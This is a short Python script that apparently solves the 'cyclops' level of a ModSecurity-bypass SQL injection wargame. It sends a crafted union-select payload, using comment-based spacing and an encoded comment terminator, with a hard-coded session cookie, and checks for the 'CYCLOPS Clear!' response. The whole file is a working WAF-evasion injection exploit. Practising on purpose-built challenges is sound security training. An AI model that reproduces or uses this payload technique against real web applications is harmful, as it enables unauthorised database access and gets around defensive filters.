import requests

url = "https://modsec.rubiya.kr/chall/cyclops_9d6a565d1cb6c38a06a6b0815344e29e.php?"
cookie = {'PHPSESSID':'l76vhg3a57sh6gnch2itdmvsoj'}

def solve():
    query = "id='<@=1 union/**/select 'first','second'%23"
    res = requests.get(url=url+query, cookies=cookie)
    if "CYCLOPS Clear!" in res.text:
        print("CYCLOPS Clear!")

if __name__ == "__main__":
    solve()